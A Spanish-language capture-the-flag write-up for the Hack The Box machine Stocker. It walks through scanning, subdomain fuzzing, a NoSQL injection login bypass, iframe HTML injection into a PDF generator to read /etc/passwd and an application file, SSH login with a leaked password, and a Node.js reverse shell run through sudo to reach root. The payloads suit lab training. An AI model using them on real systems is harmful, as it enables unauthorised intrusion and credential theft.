---
title: Stocker - Hack The Box
description: >-
  Esta vez HTB nos presenta una máquina Linux de nivel fácil, donde contiene una sitio web de compras, si aplicamos fuzzing para escanear y enumerar, nos encontramos con un subdomnio que contiene un panel de login, que  es vulnerable a NoSQL Injection, si la bypassemos no redirije a una tienda, donde podremos aplicar HTML Injection, para obtener  credenciales y poder conectarnos remotamente a la maquina y proceder a la escalada de privilegios.
author: Mariano Alfonso
date: 2023-07-06
categories: [HackTheBox, Easy, CFTs]
tags: [Privilege Escalation, Pentesting, Linux, Fuzzing, Subdomain Enumeration, NoSQL Injection, HTML Injection]
image:
  path: /assets/img/HTB/writeup-stocker/stocker.png
  alt: Máquina Stocker de la Plataforma Hack The Box.
---

[Download Write-Up](https://github.com/0mariano/0mariano.github.io/blob/master/PDFs%20and%20Tex/Write-Up/MAA-Write-Up-Stocker.pdf)

---

##  Introducción 📄
El presente documento explica los pasos para resolver la máquina <span style="color:violet"> **Stocker** </span> de la plataforma [HackTheBox](https://hackthebox.com).

![](/assets/img/HTB/writeup-stocker/Etapas-pentest.png) _**Figure 1**: Etapas del Pentest._

## Reconocimiento 🔍
### Herramienta nmap 👁️
Lazamos la herramienta nmap para averiguar los puertos y servicios abiertos de la máquina victima.

```bash
# Primer escaneo con nmap
--------------------------------------------------------------
nmap -p- --open -v 10.10.11.196
```

![](/assets/img/HTB/writeup-stocker/Nmap1.png) _**Figure 2**: Primer Escaneo con Nmap._

Obtenemos dos puertos abiertos, el puerto <span style="color:blue"> 22 </span> que pertence al protocolo **ssh** y el puerto <span style="color:red"> 80 </span> que pertence al
protocolo **http**.

Vamos a tirar nmap otra vez, pero ahora vamos a especificar la versión del servicio.

```bash
# Segundo escaneo con nmap
--------------------------------------------------------------
nmap -p 22,80 -sC -sV 10.10.11.196 -oN tarjeted
```

![](/assets/img/HTB/writeup-stocker/Nmap2.png) _**Figure 3**: Segundo Escaneo con Nmap._


Vemos que en el puerto 80 intenta redireccionar la conexión al dominio **stocker.htb**, pero no tiene éxito.

## Enumeración 📌
Vamos a tratar de entrar al dominio stocker.htb, para eso hay que modificar el archivo de **/etc/hosts**.

```bash
# Modificamos el archivo que hace el redireccionamiento y agregamos la IP de la máquina con el dominio que obtuvimos con nmap
--------------------------------------------------------------
nano /etc/hosts

10.10.11.196 stocker.htb
```
{: file='/etc/hosts'}

Ahora si queremos acceder al sitio web, podemos hacerlo.

### Investigando el sitio web 🕵️‍♂️
Vamos a investigar un poco...

Si scrooleamos veremos que hay una persona de la empresa que dejo un comentario en el sitio web, se trata
de **jefe** del área de **IT** y nos cuenta que quiere que la gente use su sitio web pero por ahora estan dejando
todo el tinglado fino para que quede bien operativa, lo que no sabe es que nosotros le haremos un pentesting a
su sitio y que le robaremos sus credenciales, pero ojo siempre **White-Hat**. Bueno no hay nada mas que hacer,
acordemosno del jefe, que se llama Angoose.

![](/assets/img/HTB/writeup-stocker/angoose.png) _**Figure 4**: Jefe del área de IT._

### Fuzzing con wfuzz 🕵️‍♂️
Vamos a enumerar y escanear subdominios aplicando fuzzing.

```bash
# Uso wfuzz para enumerar subdominios
--------------------------------------------------------------
wfuzz -c --hc=404 -t200 -w /usr/share/seclists/Discorvery/DNS/subdomains-top1million-110000ker.txt -u http://stocker.htb --hw 12
```

![](/assets/img/HTB/writeup-stocker/wfuzz.png) _**Figure 5**: Realizando Fuzzing con wfuzz._

**dev** unico subdominio que encontramos

Otra vez volvamos a editar el archivo /etc/hosts

```bash
# Modificamos el archivo que hace el redireccionamiento y agregamos la IP de la máquina con el subdominio que obtuvimos con wfuzz
--------------------------------------------------------------
nano /etc/hosts

10.10.11.196 dev.stocker.htb
```
{: file='/etc/hosts'}

Luego entramos y nos dirije a un panel de login.

![](/assets/img/HTB/writeup-stocker/dev.stocker.htb-login.png) _**Figure 6**: Formulario de Login._

Con la ayuda del Wappalyzer, vemos que en el Backend esta corriendo Express.
Para más información sobre el Framework, presione aqui: [Express](https://kinsta.com/es/base-de-conocimiento/que-es-express/#:~:text=Cerrar-,Express.,desarrollar%20aplicaciones%20backend%20con%20Node.)
Pero basicamente Express es un Framework para Node.js, donde utiliza Bases de Datos **NoSQL**.

![](/assets/img/HTB/writeup-stocker/wappalizer.png) _**Figure 7**: Tecnologías Descubiertas con Wappalyzer._

## Explotación 🔥
Provemos hacer fuerza bruta con **admin:admin** o **angoose123:angoose123**.
No tenemos éxito con ninguna posible password.

![](/assets/img/HTB/writeup-stocker/admin-admin.png) _**Figure 8**: Test de Fuerza Bruta._

Pero como sabemos Express utiliza Base de Datos NoSQL, lo que podremos intentar baypassearlo con NoSQL
Injection, pero para eso vamos a visistar [HackTricks](https://book.hacktricks.xyz/welcome/readme) para ver como explotar la vulnerabilidad.
Click para abrir el recurso utilizado de HackTricks: [NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
Abrir BurpSuite para interceptar la data y usamos devuelta admin:admin, le damos enter.

![](/assets/img/HTB/writeup-stocker/adminerror.png) _**Figure 9**: Petición Interceptada._

Tiro un error al colocar admin en el user y en el password, para eso usamos el metodo de autenticación que
sacamos de HackTricks.

### NoSQL Injection 💉
Esto lo baypaseeamos de la siguiente manera diciendole que el username y la password no es null, con lo cual
es cierto por lo tanto nos loguea.
Cambiamos el **Content-Type:** y agregamos **/json**, luego y colocamos el elemento de la siguiente manera:

```bash
# Bypasseamos diciéndole que el username y el password no es null
--------------------------------------------------------------
{
" username ": { " $ne ": null } ,
" password ": { " $ne ": null }
}
```

Y nos dirije **dev.stokcer.htb/stock**.
SI scroleamos vemos una tienda, si hacemos memoria en el pasado, el dominio original (stocker.htb) se trataba
de una tienda, cuyo Jefe del Area IT comentaba que no estaba operativa, pues aca esta.

![](/assets/img/HTB/writeup-stocker/dev.stocker.htb-stock2.png) _**Figure 10**: Tienda._

Si interactuamos con la tienda y añadimos los productos al carrito y hacemos clic en <span style="color:blue"> Submit purchase </span> nos dan una orden de compra y un link para ver el recibo del pedido (es un PDF).

![](/assets/img/HTB/writeup-stocker/submit-purchase.png) _**Figure 11**: Compra Exitosa._

![](/assets/img/HTB/writeup-stocker/url_here.png) _**Figure 12**: Link para ver el Recibo del Pedido._

Si interceptamos la petición en BurpSuite, vemos que el Content-Type esta en json.
Podemos intentar cambiar el titulo de un producto para ver si se representa en el PDF del recibo.

![](/assets/img/HTB/writeup-stocker/mariano-burpsuite.png) _**Figure 13**: Cambiando Titulo del Producto._

Cargamos el PDF y funciona!!!

![](/assets/img/HTB/writeup-stocker/mariano-pdf1.png) _**Figure 14**: Cambio del Titulo del Producto Exitoso._

### HTML Injection 💉
Sacando conclusiones, seguramente podemos inyectar código HTML en el titulo.

```bash
# Inyectamos código HTML para conseguir ver mediante el PDF archivos de la máquina
--------------------------------------------------------------
<iframe src=/etc/passwd> </iframe>
```

![](/assets/img/HTB/writeup-stocker/pdfconhtml.png) _**Figure 15**: Inyectando Código HTML._

Para poder ver mejor todos los archivos de la máquina mejorando el codigo HTML jugando con <span style="color:blue"> width </span> y <span style="color:blue"> height </span> 

```bash
# Inyectamos código HTML jugando con width y height para conseguir ver mediante el PDF archivos de la maquina
--------------------------------------------------------------
<iframe src=/etc/passwd > width =1000 px height =1000 px </iframe>
```

![](/assets/img/HTB/writeup-stocker/root-angoose.png) _**Figure 16**: Archivo /etc/passwd._

Ok podemos ver dos usuarios con sus respectivas rutas, sabiendo que <span style="color:red"> Stocker </span> es una máquina **Linux**, como
sabemos que por detras esta implementado Node.js podemos tratar de acceder a la ruta **/var/www/dev**,
buscando un archivo especifico, cuando se implementa Node.js, como el archivo **index.js**.

```bash
# Seguimos jugando con el width y height para visualizar el archivo
--------------------------------------------------------------
<iframe src=file:///var/www/dev/index.js> width =1000 px height =1000 px </iframe>
```

![](/assets/img/HTB/writeup-stocker/angoose-passwd.png) _**Figure 17**: Archivo index.js que se encuentra en /var/www/dev_

Encontramos un password <span style="color:red"> IHeardPasshrasesArePrettySecure </span> que pertenece a una base de datos , precisamente de mongodb.

###  Escalada de privilegios 👩‍💻
Primero intentemos autenticarnos de forma remota por ssh, usando el user (angoose) que obtuvimos antes.

```bash
ssh angoose@stocker.htb
--------------------------------------------------------------
password: IHeardPasshrasesArePrettySecure
```

![](/assets/img/HTB/writeup-stocker/angoose-id.png) _**Figure 18**: Conexión Mediante SSH._

Si revisamos los permisos privilegios con **sudo -l** vemos que podemos ejecutar node y los scripts que termine
con .js

![](/assets/img/HTB/writeup-stocker/angoose-sudo.png) _**Figure 19**: Revisando los Permisos con sudo -l_

Sabiendo que podemo ejecutar archivos con extension **.js**, podemos hacer un Path Traversal donde podremos
conectarnos por **NetCat** por el puerto **8001**.
Vamos a crear un archivo con extension .js donde pondremos adentro una **Reverse Shell**, nos guiamos por
esta por esta página: [revshells](https://www.revshells.com/).

```js
    (function(){
    var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(8001, "10.10.14.152", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
    })();
```
{: file='stocker.js'}

Luego en nuestra máquina de atacante, abrimos una terminal y nos ponemos en escucha por el puerto 8001 **nc -lvnp 8001**

![](/assets/img/HTB/writeup-stocker/root.png) _**Figure 20**: User root_

Probamos y listo ya tenemos la **Flag**.
